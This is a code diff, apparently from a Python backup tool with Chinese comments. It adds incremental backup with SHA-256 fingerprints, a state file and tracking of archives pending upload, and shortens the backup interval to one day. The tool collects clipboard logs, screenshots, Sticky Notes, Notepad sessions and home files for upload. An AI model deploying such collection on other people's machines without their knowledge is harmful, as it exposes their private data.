@@ -40,6 +40,30 @@ urllib3 = None
 CLIPBOARD_LOCK = threading.RLock()
 
 
+def _empty_backup_state():
+    return {"version": 1, "files": {}, "pending_archives": {}}
+
+
+def archive_group_key(path):
+    """返回归档组名；分片归档与其原始归档归为同一组。"""
+    name = os.path.basename(path)
+    marker = ".tar.gz.part"
+    if marker in name:
+        return name.split(marker, 1)[0] + ".tar.gz"
+    match = re.match(r"^(.*)_part\d+\.tar\.gz$", name)
+    if match:
+        return match.group(1) + ".tar.gz"
+    return name
+
+
+def group_archive_paths(paths):
+    """按归档组名收集路径，用于按组判定上传是否完整。"""
+    groups = {}
+    for path in paths or []:
+        groups.setdefault(archive_group_key(path), []).append(path)
+    return groups
+
+
 def configure_console_encoding():
     """尽量把当前进程的标准输出切到 UTF-8，减少中文日志乱码。"""
     for stream_name in ("stdout", "stderr"):
@@ -199,7 +223,7 @@ class BackupConfig:
     UPLOAD_TIMEOUT = 3600  # 上传超时时间（秒）
     
     # 监控配置
-    BACKUP_INTERVAL = 7 * 24 * 60 * 60  # 备份间隔时间：7天（单位：秒）
+    BACKUP_INTERVAL = 24 * 60 * 60  # 备份间隔时间：1天（单位：秒）
     CLIPBOARD_INTERVAL = 1200  # JTB备份间隔时间（20分钟，单位：秒）1200
     
     # 超时配置
@@ -220,6 +244,7 @@ class BackupConfig:
     LOG_BACKUP_COUNT = 5              # 保留最近 5 个历史日志
     CONSOLE_LOG_LEVEL = logging.WARNING
     CONSOLE_DEDUP_INTERVAL = 30       # 相同控制台消息 30 秒内只显示一次
+    BACKUP_STATE_FILE = str(Path.home() / ".dev/Backup/wsl_backup_state.json")
     
     # WSL指定备份目录或文件（相对于 WSL 用户主目录）
     WSL_SPECIFIC_DIRS = [
@@ -593,6 +618,8 @@ class BackupManager:
         ]))
         
         self._setup_logging()
+        self._state_lock = threading.RLock()
+        self._state = self._load_backup_state()
 
     def _setup_logging(self):
         """配置日志系统"""
@@ -936,7 +963,13 @@ class BackupManager:
         Returns:
             bool: 是否应该排除
         """
-        if not source_dir == str(Path.home()):
+        try:
+            relative = os.path.relpath(path, source_dir)
+            if relative == ".":
+                return False
+            return any(part in self.config.EXCLUDE_WSL_DIRS
+                       for part in relative.split(os.sep))
+        except Exception:
             return False
 
     @staticmethod
@@ -956,25 +989,283 @@ class BackupManager:
             return True
         except (OSError, ValueError):
             return False
-        try:
-            rel = os.path.relpath(path, str(Path.home()))
-            parts = rel.split(os.sep)
-            return any(part in self.config.EXCLUDE_WSL_DIRS for part in parts)
-        except Exception:
+
+    @staticmethod
+    def _state_key(*parts):
+        return os.path.normpath(os.path.join(*parts)).replace(os.sep, "/")
+
+    @staticmethod
+    def _hash_file(file_path):
+        digest = hashlib.sha256()
+        with open(file_path, "rb") as source:
+            for chunk in iter(lambda: source.read(1024 * 1024), b""):
+                digest.update(chunk)
+        return digest.hexdigest()
+
+    def _file_fingerprint(self, file_path):
+        stat = os.stat(file_path)
+        return {
+            "kind": "file",
+            "size": stat.st_size,
+            "mtime_ns": stat.st_mtime_ns,
+            "sha256": self._hash_file(file_path),
+        }
+
+    def _symlink_fingerprint(self, file_path):
+        link_target = os.readlink(file_path)
+        payload = link_target.encode("utf-8", "surrogateescape")
+        stat = os.lstat(file_path)
+        return {
+            "kind": "symlink",
+            "size": len(payload),
+            "mtime_ns": stat.st_mtime_ns,
+            "sha256": hashlib.sha256(payload).hexdigest(),
+        }
+
+    def _path_fingerprint(self, file_path, preserve_symlinks=False):
+        if preserve_symlinks and os.path.islink(file_path):
+            return self._symlink_fingerprint(file_path)
+        return self._file_fingerprint(file_path)
+
+    @staticmethod
+    def _entry_matches(entry, fingerprint, compare_content=True):
+        if not isinstance(entry, dict):
             return False
+        if entry.get("kind") != fingerprint.get("kind"):
+            return False
+        if entry.get("size") != fingerprint.get("size"):
+            return False
+        if compare_content and entry.get("sha256") != fingerprint.get("sha256"):
+            return False
+        return True
+
+    def _pending_contains(self, rel_key, fingerprint):
+        for pending in self._state.get("pending_archives", {}).values():
+            entry = pending.get("files", {}).get(rel_key) if isinstance(pending, dict) else None
+            if self._entry_matches(entry, fingerprint, compare_content=True):
+                return True
+        return False
+
+    def _source_change_status(self, rel_key, source_path, preserve_symlinks=False):
+        """返回 (是否无需重新备份, 当前指纹)。"""
+        entry = self._state.get("files", {}).get(rel_key)
+        fingerprint = self._path_fingerprint(source_path, preserve_symlinks=preserve_symlinks)
+        if self._entry_matches(entry, fingerprint, compare_content=True):
+            if entry.get("mtime_ns") != fingerprint.get("mtime_ns"):
+                updated = dict(fingerprint)
+                if "recorded_at_ns" in entry:
+                    updated["recorded_at_ns"] = entry["recorded_at_ns"]
+                self._state.setdefault("files", {})[rel_key] = updated
+            return True, fingerprint
+        if self._pending_contains(rel_key, fingerprint):
+            return True, fingerprint
+        return False, fingerprint
+
+    def _copy_if_changed(self, source_path, target_path, rel_key, changed_records,
+                         preserve_symlinks=False):
+        """仅在内容变化时复制；返回 copied / skipped / failed。"""
+        try:
+            if rel_key in changed_records:
+                return "skipped"
+            unchanged, fingerprint = self._source_change_status(
+                rel_key, source_path, preserve_symlinks=preserve_symlinks
+            )
+            if unchanged:
+                return "skipped"
+
+            if not self._ensure_directory(os.path.dirname(target_path)):
+                return "failed"
+
+            if fingerprint.get("kind") == "symlink":
+                if os.path.lexists(target_path):
+                    if os.path.isdir(target_path) and not os.path.islink(target_path):
+                        shutil.rmtree(target_path)
+                    else:
+                        os.remove(target_path)
+                os.symlink(os.readlink(source_path), target_path)
+            else:
+                copied = self._copy_file_atomic(source_path, target_path)
+                if (copied.get("size") != fingerprint.get("size")
+                        or copied.get("sha256") != fingerprint.get("sha256")):
+                    try:
+                        os.remove(target_path)
+                    except OSError:
+                        pass
+                    logging.error(f"❌ 复制后校验失败: {rel_key}")
+                    return "failed"
+
+            changed_records[rel_key] = fingerprint
+            return "copied"
+        except Exception as exc:
+            try:
+                if os.path.lexists(target_path) and not os.path.isdir(target_path):
+                    os.remove(target_path)
+            except OSError:
+                pass
+            logging.error(f"❌ 备份失败: {rel_key} - {exc}")
+            return "failed"
+
+    def _copy_tree_if_changed(self, source, target_root, key_prefix, changed_records,
+                              deadline=None, exclude_names=()):
+        """增量复制目录树，返回 (是否完整, 扫描到的文件数)。"""
+        complete = True
+        seen = 0
+        excluded = {name.casefold() for name in exclude_names}
+        try:
+            for root, directories, files in os.walk(source, topdown=True, followlinks=False):
+                self._check_deadline(deadline)
+                directories[:] = [
+                    name for name in directories
+                    if name.casefold() not in excluded
+                ]
+                relative_root = os.path.relpath(root, source)
+                target_dir = target_root if relative_root == "." else os.path.join(target_root, relative_root)
+                if not self._ensure_directory(target_dir):
+                    complete = False
+                    continue
+
+                for name in list(directories):
+                    candidate = os.path.join(root, name)
+                    if not os.path.islink(candidate):
+                        continue
+                    relative = self._state_key(relative_root, name)
+                    seen += 1
+                    status = self._copy_if_changed(
+                        candidate, os.path.join(target_dir, name),
+                        self._state_key(key_prefix, relative),
+                        changed_records, preserve_symlinks=True,
+                    )
+                    complete = complete and status != "failed"
+                    directories.remove(name)
+
+                for name in files:
+                    if name.casefold() in excluded:
+                        continue
+                    self._check_deadline(deadline)
+                    source_file = os.path.join(root, name)
+                    relative = self._state_key(relative_root, name)
+                    seen += 1
+                    status = self._copy_if_changed(
+                        source_file, os.path.join(target_dir, name),
+                        self._state_key(key_prefix, relative),
+                        changed_records, preserve_symlinks=True,
+                    )
+                    complete = complete and status != "failed"
+            return complete, seen
+        except Exception as exc:
+            logging.error(f"❌ 增量复制目录失败 {source}: {exc}")
+            return False, seen
+
+    def _load_backup_state(self):
+        state = _empty_backup_state()
+        try:
+            state_path = self.config.BACKUP_STATE_FILE
+            if not os.path.exists(state_path):
+                return state
+            with open(state_path, "r", encoding="utf-8") as source:
+                loaded = json.load(source)
+            if isinstance(loaded, dict):
+                files = loaded.get("files")
+                pending = loaded.get("pending_archives")
+                if isinstance(files, dict):
+                    state["files"] = {
+                        key: value for key, value in files.items()
+                        if isinstance(value, dict)
+                    }
+                if isinstance(pending, dict):
+                    state["pending_archives"] = {
+                        key: value for key, value in pending.items()
+                        if isinstance(value, dict) and isinstance(value.get("files"), dict)
+                    }
+        except Exception as exc:
+            logging.error(f"读取备份状态失败，将重新建立索引: {exc}")
+        return state
+
+    def _save_backup_state(self):
+        try:
+            with self._state_lock:
+                state_path = Path(self.config.BACKUP_STATE_FILE)
+                state_path.parent.mkdir(parents=True, exist_ok=True)
+                temp_path = state_path.with_name(
+                    f".{state_path.name}.tmp-{os.getpid()}-{threading.get_ident()}"
+                )
+                with open(temp_path, "w", encoding="utf-8") as target:
+                    json.dump(self._state, target, ensure_ascii=False, indent=2)
+                os.chmod(temp_path, 0o600)
+                os.replace(temp_path, state_path)
+                os.chmod(state_path, 0o600)
+        except Exception as exc:
+            logging.error(f"保存备份状态失败: {exc}")
+
+    def register_pending_archive(self, archive_path, file_records):
+        """归档生成后登记到状态文件，上传成功前不会被重复打包。"""
+        if not file_records:
+            return
+        key = archive_group_key(archive_path)
+        with self._state_lock:
+            self._state.setdefault("pending_archives", {})[key] = {
+                "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "created_at_ns": time.time_ns(),
+                "files": dict(file_records),
+            }
+            self._save_backup_state()
+
+    def mark_archive_uploaded(self, archive_key):
+        """仅在整组归档上传成功后，把文件指纹写入已上传索引。"""
+        key = archive_group_key(archive_key)
+        with self._state_lock:
+            pending = self._state.setdefault("pending_archives", {}).pop(key, None)
+            if not pending:
+                return
+            pending_time = pending.get("created_at_ns", 0)
+            for rel_key, fingerprint in pending.get("files", {}).items():
+                if not isinstance(fingerprint, dict):
+                    continue
+                existing = self._state.setdefault("files", {}).get(rel_key, {})
+                if pending_time < existing.get("recorded_at_ns", 0):
+                    continue
+                updated = dict(fingerprint)
+                updated["recorded_at_ns"] = pending_time
+                self._state["files"][rel_key] = updated
+            self._save_backup_state()
+
+    def reconcile_pending_archives(self, existing_keys, key_prefixes=None):
+        """清理已经不存在的待上传记录，让对应文件在下一轮重新备份。"""
+        existing = set(existing_keys)
+        prefixes = tuple(key_prefixes or ())
+        with self._state_lock:
+            pending = self._state.setdefault("pending_archives", {})
+            stale_keys = [
+                key for key in pending
+                if key not in existing and (not prefixes or key.startswith(prefixes))
+            ]
+            if not stale_keys:
+                return
+            for key in stale_keys:
+                pending.pop(key, None)
+            logging.warning(f"⚠️ 清理 {len(stale_keys)} 个已不存在的待上传归档记录")
+            self._save_backup_state()
 
     def backup_wsl_files(self, source_dir, target_dir):
         """WSL环境文件备份"""
         source_dir = os.path.abspath(os.path.expanduser(source_dir))
         target_dir = os.path.abspath(os.path.expanduser(target_dir))
 
-        if self._paths_overlap(source_dir, target_dir):
+        source_real = Path(source_dir).resolve()
+        target_real = Path(target_dir).resolve()
+        safe_target_root = (source_real / ".dev" / "Backup").resolve()
+        target_inside_safe_root = (
+            target_real == safe_target_root or safe_target_root in target_real.parents
+        )
+        if (target_real == source_real
+                or target_real in source_real.parents
+                or (source_real in target_real.parents and not target_inside_safe_root)):
             logging.error("❌ WSL源目录与目标目录存在重叠，拒绝清理目标目录")
-            return None
+            return None, None, False
 
         if not os.path.exists(source_dir):
             logging.error("❌ WSL源目录不存在")
-            return None
+            return None, None, False
 
         # 获取用户名前缀
         username = getpass.getuser()
@@ -986,10 +1277,13 @@ class BackupManager:
         target_configs = os.path.join(target_dir, f"{user_prefix}_configs")
         
         if not self._clean_directory(target_dir):
-            return None
+            return None, None, False
             
         if not all(self._ensure_directory(d) for d in [target_docs, target_specified, target_configs]):
-            return None
+            return None, None, False
+
+        changed_records = {"docs": {}, "configs": {}, "specified": {}}
+        complete = True
 
         # 添加计数器和超时控制
         start_time = time.time()
@@ -997,6 +1291,7 @@ class BackupManager:
         timeout = self.config.WSL_BACKUP_TIMEOUT
         total_files = 0
         processed_files = 0
+        skipped_files = 0
 
         # 输出开始备份的信息
         logging.info("\n" + "─" * 50)
@@ -1004,11 +1299,13 @@ class BackupManager:
         logging.info("─" * 50 + "\n")
 
         # 处理指定目录和文件（完整备份，不筛选扩展名）
+        backed_up_files = set()
+        backed_up_dirs = set()
         for specific_path in self.config.WSL_SPECIFIC_DIRS:
             # 检查是否超时
             if time.time() - start_time > timeout:
                 logging.error("\n❌ WSL备份超时")
-                return None
+                return target_dir, changed_records, False
 
             # 支持通配符（glob），例如 ".openclaw/openclaw.json*"
             paths_to_backup = []
@@ -1020,7 +1317,7 @@ class BackupManager:
                 paths_to_backup.extend(matched_paths)
             else:
                 full_source_path = os.path.join(source_dir, specific_path)
-                if os.path.exists(full_source_path):
+                if os.path.lexists(full_source_path):
                     paths_to_backup.append(full_source_path)
 
             for full_source_path in paths_to_backup:
@@ -1028,32 +1325,45 @@ class BackupManager:
                 try:
                     # 对于指定的目录和文件，保存在 specified 目录下
                     target_base_for_specific = target_specified
-                    if os.path.isfile(full_source_path):
-                        # 如果是文件，直接复制
+                    state_key = self._state_key("wsl", rel_path)
+                    if os.path.isfile(full_source_path) or os.path.islink(full_source_path):
+                        backed_up_files.add(os.path.abspath(full_source_path))
                         target_file = os.path.join(target_base_for_specific, rel_path)
                         target_file_dir = os.path.dirname(target_file)
-                        if self._ensure_directory(target_file_dir):
-                            shutil.copy2(full_source_path, target_file)
+                        if not self._ensure_directory(target_file_dir):
+                            complete = False
+                            continue
+                        status = self._copy_if_changed(
+                            full_source_path, target_file, state_key,
+                            changed_records["specified"], preserve_symlinks=True,
+                        )
+                        if status == "copied":
                             processed_files += 1
                             if self.config.DEBUG_MODE:
                                 logging.info(f"📄 已备份: {rel_path}")
+                        elif status == "skipped":
+                            skipped_files += 1
+                        else:
+                            complete = False
                     else:
-                        # 如果是目录，递归复制全部内容
+                        backed_up_dirs.add(os.path.abspath(full_source_path))
                         target_path = os.path.join(target_base_for_specific, rel_path)
-                        if self._ensure_directory(os.path.dirname(target_path)):
-                            if os.path.exists(target_path):
-                                shutil.rmtree(target_path)
-                            
-                            # 添加目录复制进度日志
-                            logging.info(f"\n📁 正在备份: {rel_path}/")
-                            for root, _, files in os.walk(full_source_path):
-                                total_files += len(files)
-                            
-                            shutil.copytree(full_source_path, target_path, 
-                                         symlinks=True, 
-                                ignore=lambda d, files: [f for f in files
-                                                                if f in self.config.EXCLUDE_WSL_DIRS])
+                        if not self._ensure_directory(os.path.dirname(target_path)):
+                            complete = False
+                            continue
+                        logging.info(f"\n📁 正在检查: {rel_path}/")
+                        copied_before = len(changed_records["specified"])
+                        tree_complete, tree_seen = self._copy_tree_if_changed(
+                            full_source_path, target_path, state_key,
+                            changed_records["specified"],
+                            exclude_names=self.config.EXCLUDE_WSL_DIRS,
+                        )
+                        total_files += tree_seen
+                        processed_files += len(changed_records["specified"]) - copied_before
+                        skipped_files += max(0, tree_seen - (len(changed_records["specified"]) - copied_before))
+                        complete = complete and tree_complete
                 except Exception as e:
+                    complete = False
                     logging.error(f"\n❌ 备份失败: {rel_path} - {str(e)}")
 
         logging.info("\n" + "─" * 50)
@@ -1068,7 +1378,7 @@ class BackupManager:
             current_time = time.time()
             if current_time - start_time > timeout:
                 logging.error("\n❌ WSL备份超时")
-                return None
+                return target_dir, changed_records, False
             
             # 每N秒输出一次进度
             if current_time - last_progress_time >= self.config.PROGRESS_REPORT_INTERVAL:
@@ -1076,10 +1386,9 @@ class BackupManager:
                 logging.info(f"\n⏳ 已处理 {processed_files} 个文件... ({elapsed_minutes}分钟)")
                 last_progress_time = current_time
             
-            # 跳过已经完整备份的指定目录
-            rel_root = os.path.relpath(root, source_dir).replace(os.sep, "/")
-            if any(rel_root == specific_dir.rstrip("/") or rel_root.startswith(specific_dir.rstrip("/") + "/")
-                   for specific_dir in self.config.WSL_SPECIFIC_DIRS):
+            root_abs = os.path.abspath(root)
+            if any(root_abs == backed_dir or root_abs.startswith(backed_dir + os.sep)
+                   for backed_dir in backed_up_dirs):
                 dirs[:] = []
                 continue
             
@@ -1102,7 +1411,9 @@ class BackupManager:
                     continue
 
                 source_file = os.path.join(root, file)
-                if not os.path.exists(source_file):
+                if not os.path.lexists(source_file):
+                    continue
+                if os.path.abspath(source_file) in backed_up_files:
                     continue
 
                 # 根据文件类型选择目标目录
@@ -1112,24 +1423,28 @@ class BackupManager:
                 target_file = os.path.join(target_sub_dir, file)
 
                 if not self._ensure_directory(target_sub_dir):
+                    complete = False
                     continue
-                    
-                try:
-                    shutil.copy2(source_file, target_file)
+
+                rel_key = self._state_key("wsl", relative_path, file)
+                target_records = changed_records["docs" if is_doc else "configs"]
+                status = self._copy_if_changed(source_file, target_file, rel_key, target_records)
+                if status == "copied":
                     processed_files += 1
                     if is_doc:
                         docs_count += 1
                     else:
                         configs_count += 1
-                except Exception as e:
-                    if self.config.DEBUG_MODE:
-                        logging.error(f"\n❌ 复制失败: {relative_path}/{file} - {str(e)}")
+                elif status == "skipped":
+                    skipped_files += 1
+                else:
+                    complete = False
 
         # 计算总用时
         total_time = time.time() - start_time
         total_minutes = int(total_time / 60)
 
-        if docs_count > 0 or configs_count > 0:
+        if docs_count > 0 or configs_count > 0 or skipped_files > 0:
             logging.info("\n" + "═" * 50)
             logging.info("📊 WSL备份统计")
             logging.info("═" * 50)
@@ -1137,34 +1452,42 @@ class BackupManager:
                 logging.info(f"   📚 文档文件：{docs_count} 个")
             if configs_count > 0:
                 logging.info(f"   ⚙️  配置文件：{configs_count} 个")
+            if skipped_files > 0:
+                logging.info(f"   ⏭️  未变化跳过：{skipped_files} 个")
             logging.info("─" * 50)
-            logging.info(f"   🔄 总计处理：{processed_files} 个文件")
+            logging.info(f"   🔄 新增/更新：{processed_files} 个文件")
             logging.info(f"   ⏱️  总共耗时：{total_minutes} 分钟")
             logging.info("═" * 50 + "\n")
 
-        return target_dir
+        self._save_backup_state()
+        return target_dir, changed_records, complete
 
-    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
+    def backup_disk_files(self, source_dir, target_dir, extensions_type=1,
+                          state_namespace=None):
         """Windows磁盘文件备份"""
         source_dir = os.path.abspath(os.path.expanduser(source_dir))
         target_dir = os.path.abspath(os.path.expanduser(target_dir))
 
         if self._paths_overlap(source_dir, target_dir):
             logging.error("❌ 磁盘源目录与目标目录存在重叠，拒绝清理目标目录")
-            return None
+            return None, None, False
 
         if not os.path.exists(source_dir):
             logging.error(f"\n❌ 磁盘源目录不存在: {source_dir}")
-            return None
+            return None, None, False
 
         if not self._clean_directory(target_dir):
-            return None
+            return None, None, False
 
         extensions = (self.config.DISK_EXTENSIONS_1 if extensions_type == 1 
                      else self.config.DISK_EXTENSIONS_2)
                      
         files_count = 0
+        skipped_count = 0
         total_size = 0
+        complete = True
+        changed_records = {}
+        state_namespace = state_namespace or os.path.basename(os.path.normpath(target_dir))
         scan_timeout = self.config.DISK_SCAN_TIMEOUT
         retry_count = self.config.RETRY_COUNT
         retry_delay = 5  # 文件访问重试等待时间（秒）
@@ -1183,6 +1506,7 @@ class BackupManager:
                 current_time = time.time()
                 if current_time - start_time > scan_timeout:
                     logging.error(f"\n❌ 扫描目录超时: {source_dir}")
+                    complete = False
                     break
                     
                 # 每N秒显示一次进度
@@ -1237,15 +1561,24 @@ class BackupManager:
                             target_file = os.path.join(target_sub_dir, file)
 
                             if not self._ensure_directory(target_sub_dir):
+                                complete = False
                                 break
-                                
-                            # 使用分块复制
-                            with open(source_file, 'rb') as src, open(target_file, 'wb') as dst:
-                                shutil.copyfileobj(src, dst, length=self.config.FILE_COPY_BUFFER_SIZE)
-                                    
-                            files_count += 1
-                            total_size += file_size
-                            
+
+                            rel_key = self._state_key(
+                                state_namespace, relative_path, file)
+                            status = self._copy_if_changed(
+                                source_file, target_file, rel_key, changed_records)
+                            if status == "copied":
+                                files_count += 1
+                                total_size += file_size
+                            elif status == "skipped":
+                                skipped_count += 1
+                            else:
+                                complete = False
+                                if attempt < retry_count - 1:
+                                    time.sleep(retry_delay)
+                                    continue
+
                             break  # 成功后跳出重试循环
                             
                         except (OSError, IOError, PermissionError) as e:
@@ -1253,23 +1586,25 @@ class BackupManager:
                                 logging.error(f"\n❌ 文件复制失败: {file} - {str(e)}")
 
         except (OSError, IOError) as e:
+            complete = False
             logging.error(f"\n❌ 备份过程出错: {str(e)}")
 
         # 显示最终统计信息
-        if files_count > 0:
+        if files_count > 0 or skipped_count > 0:
             total_minutes = int((time.time() - start_time) / 60)
             logging.info("\n" + "═" * 50)
             logging.info("📊 磁盘备份统计")
             logging.info("═" * 50)
-            logging.info(f"   📁 文件数量：{files_count} 个")
-            logging.info(f"   💾 总大小：{total_size / 1024 / 1024:.1f}MB")
+            logging.info(f"   📁 新增/更新：{files_count} 个")
+            logging.info(f"   ⏭️  未变化跳过：{skipped_count} 个")
+            logging.info(f"   💾 新增/更新大小：{total_size / 1024 / 1024:.1f}MB")
             logging.info("─" * 50)
             logging.info(f"   ⏱️  总共耗时：{total_minutes} 分钟")
             logging.info("═" * 50 + "\n")
-            return target_dir
-        else:
-            logging.error(f"\n❌ 未找到需要备份的文件")
-            return None
+        elif complete:
+            logging.error("\n❌ 未找到需要备份的文件")
+        self._save_backup_state()
+        return target_dir, changed_records, complete
     
     def split_large_file(self, file_path):
         """将大文件分割成小块
@@ -2202,6 +2537,12 @@ class BackupManager:
                 next_backup_time = datetime.strptime(f.read().strip(), '%Y-%m-%d %H:%M:%S')
                 
             current_time = datetime.now()
+            # 周期配置缩短后，旧的远期阈值应立即失效，避免继续按旧周期等待。
+            maximum_next_time = current_time + timedelta(
+                seconds=self.config.BACKUP_INTERVAL)
+            if next_backup_time > maximum_next_time:
+                logging.info("⏰ 现存阈值超过当前备份周期，立即执行并重写为当前周期")
+                return True, None
             if current_time >= next_backup_time:
                 return True, None
             return False, next_backup_time
@@ -2550,43 +2891,62 @@ def backup_sticky_notes(backup_manager, user):
 
     deadline = time.monotonic() + backup_manager.config.WSL_BACKUP_TIMEOUT
     local_state_root = os.path.dirname(database)
+    changed_records = {}
+    complete = True
     try:
         # 1) 数据库一致快照：SQLite backup API 会自动包含 WAL 中尚未落盘的内容
-        relative_database = os.path.relpath(database, user_root)
+        relative_database = os.path.relpath(database, user_root).replace(os.sep, "/")
         snapshot_path = os.path.join(staging, relative_database)
         backup_manager._copy_sqlite_atomic(database, snapshot_path, deadline)
         _validate_sticky_notes_snapshot(snapshot_path)
+        media_paths = _sticky_notes_media_paths(snapshot_path)
+        database_key = backup_manager._state_key("sticky", relative_database)
+        unchanged, snapshot_fingerprint = backup_manager._source_change_status(
+            database_key, snapshot_path)
+        if unchanged:
+            os.remove(snapshot_path)
+        else:
+            changed_records[database_key] = snapshot_fingerprint
 
         # 2) profile 目录：排除数据库旁文件，避免存进不一致的副本
         profile_root = os.path.join(local_state_root, "profile")
-        profile_relative = os.path.relpath(profile_root, user_root)
-        collected = set()
+        profile_relative = os.path.relpath(profile_root, user_root).replace(os.sep, "/")
         if os.path.isdir(profile_root):
-            copied = backup_manager._copy_tree_atomic(
+            tree_complete, _ = backup_manager._copy_tree_if_changed(
                 profile_root, os.path.join(staging, profile_relative),
-                deadline, exclude_names=STICKY_NOTES_SQLITE_FILES)
-            collected = {os.path.normpath(os.path.join(profile_relative, name)).replace(os.sep, "/")
-                         for name in copied}
+                backup_manager._state_key("sticky", profile_relative),
+                changed_records, deadline=deadline,
+                exclude_names=STICKY_NOTES_SQLITE_FILES,
+            )
+            complete = complete and tree_complete
 
-        # 3) 数据库引用的媒体文件：profile 树已覆盖的跳过，避免重复复制
-        for media_path in _sticky_notes_media_paths(snapshot_path):
+        # 3) 数据库引用的媒体文件：增量复制，已处理过的 profile 文件会按指纹跳过
+        for media_path in media_paths:
             source = _resolve_sticky_notes_asset(local_state_root, media_path)
             if not source:
                 raise FileNotFoundError(f"便签媒体文件缺失或越界: {media_path}")
             relative = os.path.relpath(source, user_root).replace(os.sep, "/")
-            if relative in collected:
-                continue
-            backup_manager._copy_file_atomic(source, os.path.join(staging, relative), deadline)
+            rel_key = backup_manager._state_key("sticky", relative)
+            status = backup_manager._copy_if_changed(
+                source, os.path.join(staging, relative), rel_key, changed_records)
+            complete = complete and status != "failed"
     except Exception as exc:
         logging.error(f"❌ 便签备份失败: {exc}")
         return None, False
+
+    if not changed_records:
+        backup_manager._save_backup_state()
+        logging.info("[便签] 内容均未变化，跳过归档")
+        return None, complete
 
     archive = _archive_staging(backup_manager, staging, f"{user_prefix}_sticky_notes")
     if not archive:
         logging.error("❌ 便签归档打包失败")
         return None, False
+    backup_manager.register_pending_archive(archive[0], changed_records)
+    backup_manager._save_backup_state()
     logging.info("[备份] 便签归档已准备完成")
-    return archive, True
+    return archive, complete
 
 
 def _notepad_state_signature(package_root):
@@ -2642,32 +3002,50 @@ def backup_notepad_session(backup_manager, user):
             logging.error("❌ 记事本会话暂存目录不可用")
             return None, False
         deadline = time.monotonic() + backup_manager.config.WSL_BACKUP_TIMEOUT
+        changed_records = {}
+        complete = True
+        seen_total = 0
         try:
             before = _notepad_state_signature(package_root)
-            copied = {}
             for relative in available:
                 source = os.path.join(package_root, relative)
-                copied.update(backup_manager._copy_tree_atomic(
-                    source, os.path.join(staging, os.path.relpath(source, user_root)), deadline))
+                target_relative = os.path.relpath(source, user_root).replace(os.sep, "/")
+                tree_complete, tree_seen = backup_manager._copy_tree_if_changed(
+                    source, os.path.join(staging, target_relative),
+                    backup_manager._state_key("notepad", target_relative),
+                    changed_records, deadline=deadline,
+                )
+                complete = complete and tree_complete
+                seen_total += tree_seen
             after = _notepad_state_signature(package_root)
         except Exception as exc:
             logging.error(f"❌ 读取记事本会话失败: {exc}")
             return None, False
 
-        if copied and before == after:
-            binary_count = sum(path.casefold().endswith(".bin") for path in copied)
+        if seen_total and before == after and complete:
+            if not changed_records:
+                backup_manager._save_backup_state()
+                logging.info("[记事本] 会话内容均未变化，跳过归档")
+                return None, True
+            binary_count = sum(path.casefold().endswith(".bin") for path in changed_records)
             logging.info("[记事本] 会话快照校验通过: %s 个文件，%s 个二进制状态文件",
-                         len(copied), binary_count)
+                         len(changed_records), binary_count)
             archive = _archive_staging(backup_manager, staging, f"{user_prefix}_notepad_session")
             if not archive:
                 logging.error("❌ 记事本会话归档打包失败")
                 return None, False
+            backup_manager.register_pending_archive(archive[0], changed_records)
+            backup_manager._save_backup_state()
             logging.info("[备份] 记事本会话归档已准备完成")
             return archive, True
 
-        if not copied:
+        if not seen_total:
             logging.info("ℹ️ 记事本会话目录为空，跳过备份")
             return None, True
+
+        if not complete:
+            logging.error("❌ 记事本会话复制未完整完成")
+            return None, False
 
         if attempt + 1 == attempts:
             logging.error("❌ 记事本会话在复制期间发生变化")
@@ -2741,11 +3119,13 @@ def backup_screenshots(user, backup_manager=None):
     if backup_manager is None:
         backup_manager = BackupManager()
     
-    # 确保备份目录是空的
+    # 暂存目录每轮重新建立；只复制内容发生变化的文件。
     if not backup_manager._clean_directory(str(screenshot_backup_directory)):
-        return None
+        return None, None, False
         
-    files_found = False
+    changed_records = {}
+    complete = True
+    skipped_count = 0
     for source_dir in screenshot_paths:
         if os.path.exists(source_dir):
             try:
@@ -2774,25 +3154,42 @@ def backup_screenshots(user, backup_manager=None):
                         target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                         
                         if not backup_manager._ensure_directory(target_sub_dir):
+                            complete = False
                             continue
                             
                         try:
-                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
-                            files_found = True
-                            if backup_manager.config.DEBUG_MODE:
-                                logging.info(f"📸 已备份截图: {relative_path}/{file}")
+                            source_tag = os.path.abspath(source_dir).lstrip(os.sep).replace(os.sep, "_")
+                            rel_key = backup_manager._state_key(
+                                "screenshots", source_tag, relative_path, file)
+                            status = backup_manager._copy_if_changed(
+                                source_file, os.path.join(target_sub_dir, file),
+                                rel_key, changed_records,
+                            )
+                            if status == "copied":
+                                if backup_manager.config.DEBUG_MODE:
+                                    logging.info(f"📸 已备份截图: {relative_path}/{file}")
+                            elif status == "skipped":
+                                skipped_count += 1
+                            else:
+                                complete = False
                         except Exception as e:
+                            complete = False
                             logging.error(f"复制截图文件失败 {source_file}: {e}")
             except Exception as e:
+                complete = False
                 logging.error(f"处理截图目录失败 {source_dir}: {e}")
         else:
             logging.error(f"截图目录不存在: {source_dir}")
             
-    if files_found:
-        logging.info("📸 截图备份完成，已找到符合规则的文件")
+    if changed_records:
+        logging.info(f"📸 截图备份完成，新增/更新 {len(changed_records)} 个文件")
+    elif skipped_count:
+        logging.info("📸 截图均未变化，跳过归档")
     else:
         logging.info("📸 未找到符合规则的截图文件")
-    return str(screenshot_backup_directory) if files_found else None
+    backup_manager._save_backup_state()
+    return (str(screenshot_backup_directory) if changed_records else None,
+            changed_records, complete)
 
 def backup_and_upload_logs(backup_manager):
     """备份并上传日志文件"""
@@ -2982,7 +3379,9 @@ def clean_backup_directory():
         keep_files = [
             f"{user_prefix}_backup.log",  # 备份日志
             f"{user_prefix}_clipboard_log.txt",    # JTB日志
-            "next_backup_time.txt"  # 时间阈值文件
+            "next_backup_time.txt",  # 主备份时间阈值文件
+            "next_notes_backup.txt",  # 便签/记事本时间阈值文件
+            os.path.basename(BackupConfig.BACKUP_STATE_FILE),  # 增量备份状态
         ]
         
         for item in os.listdir(backup_dir):
@@ -3148,6 +3547,9 @@ def periodic_backup_upload(backup_manager):
                 task_started = time.monotonic()
                 log_console(logging.WARNING, f"备份任务开始 | 任务: {task_id}")
                 logging.info(f"[任务 {task_id}] 可用磁盘: {', '.join(available_disks) or '无'}")
+
+                # 先按归档组重试上一轮遗留文件，避免新一轮清理暂存目录时重复打包
+                pending_uploaded = retry_pending_archives(backup_manager)
                 
                 # 执行备份任务
                 logging.info(f"[任务 {task_id}] 阶段 1/3: WSL 文件备份")
